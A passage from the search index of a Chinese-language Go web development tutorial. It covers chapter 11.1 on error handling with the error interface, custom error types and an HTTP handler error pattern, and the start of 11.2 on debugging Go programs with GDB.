\u7c7b\u4f3c\u4e8e<code>os.Open</code>\u51fd\u6570\uff0c\u6807\u51c6\u5305\u4e2d\u6240\u6709\u53ef\u80fd\u51fa\u9519\u7684API\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2aerror\u53d8\u91cf\uff0c\u4ee5\u65b9\u4fbf\u9519\u8bef\u5904\u7406\uff0c\u8fd9\u4e2a\u5c0f\u8282\u5c06\u8be6\u7ec6\u5730\u4ecb\u7ecderror\u7c7b\u578b\u7684\u8bbe\u8ba1\uff0c\u548c\u8ba8\u8bba\u5f00\u53d1Web\u5e94\u7528\u4e2d\u5982\u4f55\u66f4\u597d\u5730\u5904\u7406error\u3002</p>"},{"location":"11.1/#error","title":"Error\u7c7b\u578b","text":"<p>error\u7c7b\u578b\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\u578b\uff0c\u8fd9\u662f\u5b83\u7684\u5b9a\u4e49\uff1a <pre><code>type error interface {\nError() string\n}\n</code></pre> error\u662f\u4e00\u4e2a\u5185\u7f6e\u7684\u63a5\u53e3\u7c7b\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u5728/builtin/\u5305\u4e0b\u9762\u627e\u5230\u76f8\u5e94\u7684\u5b9a\u4e49\u3002\u800c\u6211\u4eec\u5728\u5f88\u591a\u5185\u90e8\u5305\u91cc\u9762\u7528\u5230\u7684 error\u662ferrors\u5305\u4e0b\u9762\u7684\u5b9e\u73b0\u7684\u79c1\u6709\u7ed3\u6784errorString <pre><code>// errorString is a trivial implementation of error.\ntype errorString struct {\ns string\n}\n\nfunc (e *errorString) Error() string {\nreturn e.s\n}\n</code></pre> \u4f60\u53ef\u4ee5\u901a\u8fc7<code>errors.New</code>\u628a\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u5316\u4e3aerrorString\uff0c\u4ee5\u5f97\u5230\u4e00\u4e2a\u6ee1\u8db3\u63a5\u53e3error\u7684\u5bf9\u8c61\uff0c\u5176\u5185\u90e8\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>// New returns an error that formats as the given text.\nfunc New(text string) error {\nreturn &amp;errorString{text}\n}\n</code></pre> \u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u6f14\u793a\u4e86\u5982\u4f55\u4f7f\u7528<code>errors.New</code>: <pre><code>func Sqrt(f float64) (float64, error) {\nif f &lt; 0 {\nreturn 0, errors.New(\"math: square root of negative number\")\n}\n// implementation\n}\n</code></pre> \u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5728\u8c03\u7528Sqrt\u7684\u65f6\u5019\u4f20\u9012\u7684\u4e00\u4e2a\u8d1f\u6570\uff0c\u7136\u540e\u5c31\u5f97\u5230\u4e86non-nil\u7684error\u5bf9\u8c61\uff0c\u5c06\u6b64\u5bf9\u8c61\u4e0enil\u6bd4\u8f83\uff0c\u7ed3\u679c\u4e3atrue\uff0c\u6240\u4ee5fmt.Println(fmt\u5305\u5728\u5904\u7406error\u65f6\u4f1a\u8c03\u7528Error\u65b9\u6cd5)\u88ab\u8c03\u7528\uff0c\u4ee5\u8f93\u51fa\u9519\u8bef\uff0c\u8bf7\u770b\u4e0b\u9762\u8c03\u7528\u7684\u793a\u4f8b\u4ee3\u7801\uff1a <pre><code>f, err := Sqrt(-1)\nif err != nil {\nfmt.Println(err)\n}   </code></pre></p>"},{"location":"11.1/#error_1","title":"\u81ea\u5b9a\u4e49Error","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u77e5\u9053error\u662f\u4e00\u4e2ainterface\uff0c\u6240\u4ee5\u5728\u5b9e\u73b0\u81ea\u5df1\u7684\u5305\u7684\u65f6\u5019\uff0c\u901a\u8fc7\u5b9a\u4e49\u5b9e\u73b0\u6b64\u63a5\u53e3\u7684\u7ed3\u6784\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u81ea\u5df1\u7684\u9519\u8bef\u5b9a\u4e49\uff0c\u8bf7\u770b\u6765\u81eaJson\u5305\u7684\u793a\u4f8b\uff1a <pre><code>type SyntaxError struct {\nmsg    string // \u9519\u8bef\u63cf\u8ff0\nOffset int64  // \u9519\u8bef\u53d1\u751f\u7684\u4f4d\u7f6e\n}\n\nfunc (e *SyntaxError) Error() string { return e.msg }\n</code></pre> Offset\u5b57\u6bb5\u5728\u8c03\u7528Error\u7684\u65f6\u5019\u4e0d\u4f1a\u88ab\u6253\u5370\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7c7b\u578b\u65ad\u8a00\u83b7\u53d6\u9519\u8bef\u7c7b\u578b\uff0c\u7136\u540e\u53ef\u4ee5\u6253\u5370\u76f8\u5e94\u7684\u9519\u8bef\u4fe1\u606f\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50: <pre><code>if err := dec.Decode(&amp;val); err != nil {\nif serr, ok := err.(*json.SyntaxError); ok {\nline, col := findLine(f, serr.Offset)\nreturn fmt.Errorf(\"%s:%d:%d: %v\", f.Name(), line, col, err)\n}\nreturn err\n}\n</code></pre> \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u8fd4\u56de\u81ea\u5b9a\u4e49\u9519\u8bef\u65f6\uff0c\u8fd4\u56de\u503c\u63a8\u8350\u8bbe\u7f6e\u4e3aerror\u7c7b\u578b\uff0c\u800c\u975e\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\uff0c\u7279\u522b\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e0d\u5e94\u9884\u58f0\u660e\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u7684\u53d8\u91cf\u3002\u4f8b\u5982\uff1a <pre><code>func Decode() *SyntaxError { // \u9519\u8bef\uff0c\u5c06\u53ef\u80fd\u5bfc\u81f4\u4e0a\u5c42\u8c03\u7528\u8005err!=nil\u7684\u5224\u65ad\u6c38\u8fdc\u4e3atrue\u3002\nvar err *SyntaxError     // \u9884\u58f0\u660e\u9519\u8bef\u53d8\u91cf\nif \u51fa\u9519\u6761\u4ef6 {\nerr = &amp;SyntaxError{}\n}\nreturn err               // \u9519\u8bef\uff0cerr\u6c38\u8fdc\u7b49\u4e8e\u975enil\uff0c\u5bfc\u81f4\u4e0a\u5c42\u8c03\u7528\u8005err!=nil\u7684\u5224\u65ad\u59cb\u7ec8\u4e3atrue\n}\n</code></pre> \u539f\u56e0\u89c1 http://golang.org/doc/faq#nil_error</p> <p>\u4e0a\u9762\u4f8b\u5b50\u7b80\u5355\u7684\u6f14\u793a\u4e86\u5982\u4f55\u81ea\u5b9a\u4e49Error\u7c7b\u578b\u3002\u4f46\u662f\u5982\u679c\u6211\u4eec\u8fd8\u9700\u8981\u66f4\u590d\u6742\u7684\u9519\u8bef\u5904\u7406\u5462\uff1f\u6b64\u65f6\uff0c\u6211\u4eec\u6765\u53c2\u8003\u4e00\u4e0bnet\u5305\u91c7\u7528\u7684\u65b9\u6cd5\uff1a <pre><code>package net\n\ntype Error interface {\nerror\nTimeout() bool   // Is the error a timeout?\nTemporary() bool // Is the error temporary?\n}\n</code></pre> \u5728\u8c03\u7528\u7684\u5730\u65b9\uff0c\u901a\u8fc7\u7c7b\u578b\u65ad\u8a00err\u662f\u4e0d\u662fnet.Error,\u6765\u7ec6\u5316\u9519\u8bef\u7684\u5904\u7406\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\uff0c\u5982\u679c\u4e00\u4e2a\u7f51\u7edc\u53d1\u751f\u4e34\u65f6\u6027\u9519\u8bef\uff0c\u90a3\u4e48\u5c06\u4f1asleep 1\u79d2\u4e4b\u540e\u91cd\u8bd5\uff1a <pre><code>if nerr, ok := err.(net.Error); ok &amp;&amp; nerr.Temporary() {\ntime.Sleep(1e9)\ncontinue\n}\nif err != nil {\nlog.Fatal(err)\n}\n</code></pre></p>"},{"location":"11.1/#_1","title":"\u9519\u8bef\u5904\u7406","text":"<p>Go\u5728\u9519\u8bef\u5904\u7406\u4e0a\u91c7\u7528\u4e86\u4e0eC\u7c7b\u4f3c\u7684\u68c0\u67e5\u8fd4\u56de\u503c\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u662f\u5176\u4ed6\u591a\u6570\u4e3b\u6d41\u8bed\u8a00\u91c7\u7528\u7684\u5f02\u5e38\u65b9\u5f0f\uff0c\u8fd9\u9020\u6210\u4e86\u4ee3\u7801\u7f16\u5199\u4e0a\u7684\u4e00\u4e2a\u5f88\u5927\u7684\u7f3a\u70b9:\u9519\u8bef\u5904\u7406\u4ee3\u7801\u7684\u5197\u4f59\uff0c\u5bf9\u4e8e\u8fd9\u79cd\u60c5\u51b5\u662f\u6211\u4eec\u901a\u8fc7\u590d\u7528\u68c0\u6d4b\u51fd\u6570\u6765\u51cf\u5c11\u7c7b\u4f3c\u7684\u4ee3\u7801\u3002</p> <p>\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4ee3\u7801\uff1a <pre><code>func init() {\nhttp.HandleFunc(\"/view\", viewRecord)\n}\n\nfunc viewRecord(w http.ResponseWriter, r *http.Request) {\nc := appengine.NewContext(r)\nkey := datastore.NewKey(c, \"Record\", r.FormValue(\"id\"), 0, nil)\nrecord := new(Record)\nif err := datastore.Get(c, key, record); err != nil {\nhttp.Error(w, err.Error(), 500)\nreturn\n}\nif err := viewTemplate.Execute(w, record); err != nil {\nhttp.Error(w, err.Error(), 500)\n}\n}\n</code></pre> \u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u83b7\u53d6\u6570\u636e\u548c\u6a21\u677f\u5c55\u793a\u8c03\u7528\u65f6\u90fd\u6709\u68c0\u6d4b\u9519\u8bef\uff0c\u5f53\u6709\u9519\u8bef\u53d1\u751f\u65f6\uff0c\u8c03\u7528\u4e86\u7edf\u4e00\u7684\u5904\u7406\u51fd\u6570<code>http.Error</code>\uff0c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef500\u9519\u8bef\u7801\uff0c\u5e76\u663e\u793a\u76f8\u5e94\u7684\u9519\u8bef\u6570\u636e\u3002\u4f46\u662f\u5f53\u8d8a\u6765\u8d8a\u591a\u7684HandleFunc\u52a0\u5165\u4e4b\u540e\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u5904\u7406\u903b\u8f91\u4ee3\u7801\u5c31\u4f1a\u8d8a\u6765\u8d8a\u591a\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u81ea\u5b9a\u4e49\u8def\u7531\u5668\u6765\u7f29\u51cf\u4ee3\u7801(\u5b9e\u73b0\u7684\u601d\u8def\u53ef\u4ee5\u53c2\u8003\u7b2c\u4e09\u7ae0\u7684HTTP\u8be6\u89e3)\u3002 <pre><code>type appHandler func(http.ResponseWriter, *http.Request) error\n\nfunc (fn appHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\nif err := fn(w, r); err != nil {\nhttp.Error(w, err.Error(), 500)\n}\n}\n</code></pre> \u4e0a\u9762\u6211\u4eec\u5b9a\u4e49\u4e86\u81ea\u5b9a\u4e49\u7684\u8def\u7531\u5668\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u6765\u6ce8\u518c\u51fd\u6570\uff1a <pre><code>func init() {\nhttp.Handle(\"/view\", appHandler(viewRecord))\n}\n</code></pre> \u5f53\u8bf7\u6c42/view\u7684\u65f6\u5019\u6211\u4eec\u7684\u903b\u8f91\u5904\u7406\u53ef\u4ee5\u53d8\u6210\u5982\u4e0b\u4ee3\u7801\uff0c\u548c\u7b2c\u4e00\u79cd\u5b9e\u73b0\u65b9\u5f0f\u76f8\u6bd4\u8f83\u5df2\u7ecf\u7b80\u5355\u4e86\u5f88\u591a\u3002 <pre><code>func viewRecord(w http.ResponseWriter, r *http.Request) error {\nc := appengine.NewContext(r)\nkey := datastore.NewKey(c, \"Record\", r.FormValue(\"id\"), 0, nil)\nrecord := new(Record)\nif err := datastore.Get(c, key, record); err != nil {\nreturn err\n}\nreturn viewTemplate.Execute(w, record)\n}\n</code></pre> \u4e0a\u9762\u7684\u4f8b\u5b50\u9519\u8bef\u5904\u7406\u7684\u65f6\u5019\u6240\u6709\u7684\u9519\u8bef\u8fd4\u56de\u7ed9\u7528\u6237\u7684\u90fd\u662f500\u9519\u8bef\u7801\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u76f8\u5e94\u7684\u9519\u8bef\u4ee3\u7801\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u628a\u8fd9\u4e2a\u9519\u8bef\u4fe1\u606f\u5b9a\u4e49\u7684\u66f4\u52a0\u53cb\u597d\uff0c\u8c03\u8bd5\u7684\u65f6\u5019\u4e5f\u65b9\u4fbf\u5b9a\u4f4d\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8fd4\u56de\u7684\u9519\u8bef\u7c7b\u578b\uff1a <pre><code>type appError struct {\nError   error\nMessage string\nCode    int\n}\n</code></pre> \u8fd9\u6837\u6211\u4eec\u7684\u81ea\u5b9a\u4e49\u8def\u7531\u5668\u53ef\u4ee5\u6539\u6210\u5982\u4e0b\u65b9\u5f0f\uff1a <pre><code>type appHandler func(http.ResponseWriter, *http.Request) *appError\n\nfunc (fn appHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\nif e := fn(w, r); e != nil { // e is *appError, not os.Error.\nc := appengine.NewContext(r)\nc.Errorf(\"%v\", e.Error)\nhttp.Error(w, e.Message, e.Code)\n}\n}\n</code></pre> \u8fd9\u6837\u4fee\u6539\u5b8c\u81ea\u5b9a\u4e49\u9519\u8bef\u4e4b\u540e\uff0c\u6211\u4eec\u7684\u903b\u8f91\u5904\u7406\u53ef\u4ee5\u6539\u6210\u5982\u4e0b\u65b9\u5f0f\uff1a <pre><code>func viewRecord(w http.ResponseWriter, r *http.Request) *appError {\nc := appengine.NewContext(r)\nkey := datastore.NewKey(c, \"Record\", r.FormValue(\"id\"), 0, nil)\nrecord := new(Record)\nif err := datastore.Get(c, key, record); err != nil {\nreturn &amp;appError{err, \"Record not found\", 404}\n}\nif err := viewTemplate.Execute(w, record); err != nil {\nreturn &amp;appError{err, \"Can't display record\", 500}\n}\nreturn nil\n}\n</code></pre> \u5982\u4e0a\u6240\u793a\uff0c\u5728\u6211\u4eec\u8bbf\u95eeview\u7684\u65f6\u5019\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u83b7\u53d6\u4e0d\u540c\u7684\u9519\u8bef\u7801\u548c\u9519\u8bef\u4fe1\u606f\uff0c\u867d\u7136\u8fd9\u4e2a\u548c\u7b2c\u4e00\u4e2a\u7248\u672c\u7684\u4ee3\u7801\u91cf\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u8fd9\u4e2a\u663e\u793a\u7684\u9519\u8bef\u66f4\u52a0\u660e\u663e\uff0c\u63d0\u793a\u7684\u9519\u8bef\u4fe1\u606f\u66f4\u52a0\u53cb\u597d\uff0c\u6269\u5c55\u6027\u4e5f\u6bd4\u7b2c\u4e00\u4e2a\u66f4\u597d\u3002</p>"},{"location":"11.1/#_2","title":"\u603b\u7ed3","text":"<p>\u5728\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\uff0c\u5bb9\u9519\u662f\u76f8\u5f53\u91cd\u8981\u7684\u4e00\u90e8\u5206\u5de5\u4f5c\uff0c\u5728Go\u4e2d\u5b83\u662f\u901a\u8fc7\u9519\u8bef\u5904\u7406\u6765\u5b9e\u73b0\u7684\uff0cerror\u867d\u7136\u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u4f46\u662f\u5176\u53d8\u5316\u5374\u53ef\u4ee5\u6709\u5f88\u591a\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u5b9e\u73b0\u4e0d\u540c\u7684\u5904\u7406\uff0c\u6700\u540e\u4ecb\u7ecd\u7684\u9519\u8bef\u5904\u7406\u65b9\u6848\uff0c\u5e0c\u671b\u80fd\u7ed9\u5927\u5bb6\u5728\u5982\u4f55\u8bbe\u8ba1\u66f4\u597dWeb\u9519\u8bef\u5904\u7406\u65b9\u6848\u4e0a\u5e26\u6765\u4e00\u70b9\u601d\u8def\u3002</p>"},{"location":"11.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9519\u8bef\u5904\u7406\uff0c\u8c03\u8bd5\u548c\u6d4b\u8bd5</li> <li>\u4e0b\u4e00\u8282: \u4f7f\u7528GDB\u8c03\u8bd5</li> </ul>"},{"location":"11.2/","title":"11.2 \u4f7f\u7528GDB\u8c03\u8bd5","text":"<p>\u5f00\u53d1\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u8c03\u8bd5\u4ee3\u7801\u662f\u5f00\u53d1\u8005\u7ecf\u5e38\u8981\u505a\u7684\u4e00\u4ef6\u4e8b\u60c5\uff0cGo\u8bed\u8a00\u4e0d\u50cfPHP\u3001Python\u7b49\u52a8\u6001\u8bed\u8a00\uff0c\u53ea\u8981\u4fee\u6539\u4e0d\u9700\u8981\u7f16\u8bd1\u5c31\u53ef\u4ee5\u76f4\u63a5\u8f93\u51fa\uff0c\u800c\u4e14\u53ef\u4ee5\u52a8\u6001\u7684\u5728\u8fd0\u884c\u73af\u5883\u4e0b\u6253\u5370\u6570\u636e\u3002\u5f53\u7136Go\u8bed\u8a00\u4e5f\u53ef\u4ee5\u901a\u8fc7Println\u4e4b\u7c7b\u7684\u6253\u5370\u6570\u636e\u6765\u8c03\u8bd5\uff0c\u4f46\u662f\u6bcf\u6b21\u90fd\u9700\u8981\u91cd\u65b0\u7f16\u8bd1\uff0c\u8fd9\u662f\u4e00\u4ef6\u76f8\u5f53\u9ebb\u70e6\u7684\u4e8b\u60c5\u3002\u6211\u4eec\u77e5\u9053\u5728Python\u4e2d\u6709pdb/ipdb\u4e4b\u7c7b\u7684\u5de5\u5177\u8c03\u8bd5\uff0cJavascript\u4e5f\u6709\u7c7b\u4f3c\u5de5\u5177\uff0c\u8fd9\u4e9b\u5de5\u5177\u90fd\u80fd\u591f\u52a8\u6001\u7684\u663e\u793a\u53d8\u91cf\u4fe1\u606f\uff0c\u5355\u6b65\u8c03\u8bd5\u7b49\u3002\u4e0d\u8fc7\u5e86\u5e78\u7684\u662fGo\u4e5f\u6709\u7c7b\u4f3c\u7684\u5de5\u5177\u652f\u6301\uff1aGDB\u3002Go\u5185\u90e8\u5df2\u7ecf\u5185\u7f6e\u652f\u6301\u4e86GDB\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7GDB\u6765\u8fdb\u884c\u8c03\u8bd5\uff0c\u90a3\u4e48\u672c\u5c0f\u8282\u5c31\u6765\u4ecb\u7ecd\u4e00\u4e0b\u5982\u4f55\u901a\u8fc7GDB\u6765\u8c03\u8bd5Go\u7a0b\u5e8f\u3002</p> <p>\u53e6\u5916\u5efa\u8bae\u7eafgo\u4ee3\u7801\u4f7f\u7528delve\u53ef\u4ee5\u5f88\u597d\u7684\u8fdb\u884cGo\u4ee3\u7801\u8c03\u8bd5</p>"},{"location":"11.2/#gdb","title":"GDB\u8c03\u8bd5\u7b80\u4ecb","text":"<p>GDB\u662fFSF(\u81ea\u7531\u8f6f\u4ef6\u57fa\u91d1\u4f1a)\u53d1\u5e03\u7684\u4e00\u4e2a\u5f3a\u5927\u7684\u7c7bUNIX\u7cfb\u7edf\u4e0b\u7684\u7a0b\u5e8f\u8c03\u8bd5\u5de5\u5177\u3002\u4f7f\u7528GDB\u53ef\u4ee5\u505a\u5982\u4e0b\u4e8b\u60c5\uff1a</p> <ol> <li>\u542f\u52a8\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u6309\u7167\u5f00\u53d1\u8005\u7684\u81ea\u5b9a\u4e49\u8981\u6c42\u8fd0\u884c\u7a0b\u5e8f\u3002</li> <li>\u53ef\u8ba9\u88ab\u8c03\u8bd5\u7684\u7a0b\u5e8f\u5728\u5f00\u53d1\u8005\u8bbe\u5b9a\u7684\u8c03\u7f6e\u7684\u65ad\u70b9\u5904\u505c\u4f4f\u3002\uff08\u65ad\u70b9\u53ef\u4ee5\u662f\u6761\u4ef6\u8868\u8fbe\u5f0f\uff09</li> <li>\u5f53\u7a0b\u5e8f\u88ab\u505c\u4f4f\u65f6\uff0c\u53ef\u4ee5\u68c0\u67e5\u6b64\u65f6\u7a0b\u5e8f\u4e2d\u6240\u53d1\u751f\u7684\u4e8b\u3002</li> <li>\u52a8\u6001\u7684\u6539\u53d8\u5f53\u524d\u7a0b\u5e8f\u7684\u6267\u884c\u73af\u5883\u3002</li> </ol> <p>\u76ee\u524d\u652f\u6301\u8c03\u8bd5Go\u7a0b\u5e8f\u7684GDB\u7248\u672c\u5fc5\u987b\u5927\u4e8e7.1\u3002</p> <p>\u7f16\u8bd1Go\u7a0b\u5e8f\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9</p> <ol> <li>\u4f20\u9012\u53c2\u6570-ldflags \"-s\"\uff0c\u5ffd\u7565debug\u7684\u6253\u5370\u4fe1\u606f</li> <li>\u4f20\u9012-gcflags \"-N -l\" \u53c2\u6570\uff0c\u8fd9\u6837\u53ef\u4ee5\u5ffd\u7565Go\u5185\u90e8\u505a\u7684\u4e00\u4e9b\u4f18\u5316\uff0c\u805a\u5408\u53d8\u91cf\u548c\u51fd\u6570\u7b49\u4f18\u5316\uff0c\u8fd9\u6837\u5bf9\u4e8eGDB\u8c03\u8bd5\u6765\u8bf4\u975e\u5e38\u56f0\u96be\uff0c\u6240\u4ee5\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u52a0\u5165\u8fd9\u4e24\u4e2a\u53c2\u6570\u907f\u514d\u8fd9\u4e9b\u4f18\u5316\u3002 </li> </ol>"},{"location":"11.2/#_1","title":"\u5e38\u7528\u547d\u4ee4","text":"<p>GDB\u7684\u4e00\u4e9b\u5e38\u7528\u547d\u4ee4\u5982\u4e0b\u6240\u793a</p> <ul> <li> <p>list</p> <p>\u7b80\u5199\u547d\u4ee4<code>l</code>\uff0c\u7528\u6765\u663e\u793a\u6e90\u4ee3\u7801\uff0c\u9ed8\u8ba4\u663e\u793a\u5341\u884c\u4ee3\u7801\uff0c\u540e\u9762\u53ef\u4ee5\u5e26\u4e0a\u53c2\u6570\u663e\u793a\u7684\u5177\u4f53\u884c\uff0c\u4f8b\u5982\uff1a<code>list 15</code>\uff0c\u663e\u793a\u5341\u884c\u4ee3\u7801\uff0c\u5176\u4e2d\u7b2c15\u884c\u5728\u663e\u793a\u7684\u5341\u884c\u91cc\u9762\u7684\u4e2d\u95f4\uff0c\u5982\u4e0b\u6240\u793a\u3002</p> <pre><code>10          time.Sleep(2 * time.Second)\n11          c &lt;- i\n12      }\n13      close(c)\n14  }\n15  \n16  func main() {\n17      msg := \"Starting main\"\n18      fmt.Println(msg)\n19      bus := make(chan int)\n</code></pre> </li> <li> <p>break</p> <p>\u7b80\u5199\u547d\u4ee4 <code>b</code>,\u7528\u6765\u8bbe\u7f6e\u65ad\u70b9\uff0c\u540e\u9762\u8ddf\u4e0a\u53c2\u6570\u8bbe\u7f6e\u65ad\u70b9\u7684\u884c\u6570\uff0c\u4f8b\u5982<code>b 10</code>\u5728\u7b2c\u5341\u884c\u8bbe\u7f6e\u65ad\u70b9\u3002</p> </li> <li> <p>delete     \u7b80\u5199\u547d\u4ee4 <code>d</code>,\u7528\u6765\u5220\u9664\u65ad\u70b9\uff0c\u540e\u9762\u8ddf\u4e0a\u65ad\u70b9\u8bbe\u7f6e\u7684\u5e8f\u53f7\uff0c\u8fd9\u4e2a\u5e8f\u53f7\u53ef\u4ee5\u901a\u8fc7<code>info breakpoints</code>\u83b7\u53d6\u76f8\u5e94\u7684\u8bbe\u7f6e\u7684\u65ad\u70b9\u5e8f\u53f7\uff0c\u5982\u4e0b\u662f\u663e\u793a\u7684\u8bbe\u7f6e\u65ad\u70b9\u5e8f\u53f7\u3002</p> <pre><code>Num     Type           Disp Enb Address            What\n2       breakpoint     keep y   0x0000000000400dc3 in main.main at /home/xiemengjun/gdb.go:23\nbreakpoint already hit 1 time\n</code></pre> </li> <li> <p>backtrace</p> <p>\u7b80\u5199\u547d\u4ee4 <code>bt</code>,\u7528\u6765\u6253\u5370\u6267\u884c\u7684\u4ee3\u7801\u8fc7\u7a0b\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>#0  main.main () at /home/xiemengjun/gdb.go:23\n#1  0x000000000040d61e in runtime.main () at /home/xiemengjun/go/src/pkg/runtime/proc.c:244\n#2  0x000000000040d6c1 in schedunlock () at /home/xiemengjun/go/src/pkg/runtime/proc.c:267\n#3  0x0000000000000000 in ?? ()\n</code></pre> <ul> <li>info</li> </ul> <p>info\u547d\u4ee4\u7528\u6765\u663e\u793a\u4fe1\u606f\uff0c\u540e\u9762\u6709\u51e0\u79cd\u53c2\u6570\uff0c\u6211\u4eec\u5e38\u7528\u7684\u6709\u5982\u4e0b\u51e0\u79cd\uff1a</p> <ul> <li> <p><code>info locals</code></p> <p>\u663e\u793a\u5f53\u524d\u6267\u884c\u7684\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u503c     - <code>info breakpoints</code></p> <p>\u663e\u793a\u5f53\u524d\u8bbe\u7f6e\u7684\u65ad\u70b9\u5217\u8868     - <code>info goroutines</code></p> <p>\u663e\u793a\u5f53\u524d\u6267\u884c\u7684goroutine\u5217\u8868\uff0c\u5982\u4e0b\u4ee3\u7801\u6240\u793a,\u5e26*\u7684\u8868\u793a\u5f53\u524d\u6267\u884c\u7684</p> <pre><code>* 1  running runtime.gosched\n* 2  syscall runtime.entersyscall\n  3  waiting runtime.gosched\n  4 runnable runtime.gosched\n</code></pre> <ul> <li>print</li> </ul> </li> </ul> <p>\u7b80\u5199\u547d\u4ee4<code>p</code>\uff0c\u7528\u6765\u6253\u5370\u53d8\u91cf\u6216\u8005\u5176\u4ed6\u4fe1\u606f\uff0c\u540e\u9762\u8ddf\u4e0a\u9700\u8981\u6253\u5370\u7684\u53d8\u91cf\u540d\uff0c\u5f53\u7136\u8fd8\u6709\u4e00\u4e9b\u5f88\u6709\u7528\u7684\u51fd\u6570\\(len()\u548c\\)cap()\uff0c\u7528\u6765\u8fd4\u56de\u5f53\u524dstring\u3001slices\u6216\u8005maps\u7684\u957f\u5ea6\u548c\u5bb9\u91cf\u3002</p> </li> <li> <p>whatis </p> <p>\u7528\u6765\u663e\u793a\u5f53\u524d\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u540e\u9762\u8ddf\u4e0a\u53d8\u91cf\u540d\uff0c\u4f8b\u5982<code>whatis msg</code>,\u663e\u793a\u5982\u4e0b\uff1a</p> <pre><code>type = struct string\n</code></pre> <ul> <li>next</li> </ul> <p>\u7b80\u5199\u547d\u4ee4 <code>n</code>,\u7528\u6765\u5355\u6b65\u8c03\u8bd5\uff0c\u8df3\u5230\u4e0b\u4e00\u6b65\uff0c\u5f53\u6709\u65ad\u70b9\u4e4b\u540e\uff0c\u53ef\u4ee5\u8f93\u5165<code>n</code>\u8df3\u8f6c\u5230\u4e0b\u4e00\u6b65\u7ee7\u7eed\u6267\u884c - continue</p> <p>\u7b80\u79f0\u547d\u4ee4 <code>c</code>\uff0c\u7528\u6765\u8df3\u51fa\u5f53\u524d\u65ad\u70b9\u5904\uff0c\u540e\u9762\u53ef\u4ee5\u8ddf\u53c2\u6570N\uff0c\u8df3\u8fc7\u591a\u5c11\u6b21\u65ad\u70b9</p> </li> <li> <p>set variable</p> <p>\u8be5\u547d\u4ee4\u7528\u6765\u6539\u53d8\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u53d8\u91cf\u503c\uff0c\u683c\u5f0f\u5982\uff1a<code>set variable &lt;var&gt;=&lt;value&gt;</code></p> </li> </ul>"},{"location":"11.2/#_2","title":"\u8c03\u8bd5\u8fc7\u7a0b","text":"<p>\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u8fd9\u4e2a\u4ee3\u7801\u6765\u6f14\u793a\u5982\u4f55\u901a\u8fc7GDB\u6765\u8c03\u8bd5Go\u7a0b\u5e8f\uff0c\u4e0b\u9762\u662f\u5c06\u8981\u6f14\u793a\u7684\u4ee3\u7801\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"time\"\n)\n\nfunc counting(c chan&lt;- int) {\nfor i := 0; i &lt; 10; i++ {\ntime.Sleep(2 * time.Second)\nc &lt;- i\n}\nclose(c)\n}\n\nfunc main() {\nmsg := \"Starting main\"\nfmt.Println(msg)\nbus := make(chan int)\nmsg = \"starting a gofunc\"\ngo counting(bus)\nfor count := range bus {\nfmt.Println(\"count:\", count)\n}\n}\n</code></pre> \u7f16\u8bd1\u6587\u4ef6\uff0c\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6gdbfile:</p> <pre><code>go build -gcflags \"-N -l\" gdbfile.go\n</code></pre> <p>\u901a\u8fc7gdb\u547d\u4ee4\u542f\u52a8\u8c03\u8bd5\uff1a</p> <pre><code>gdb gdbfile\n</code></pre> 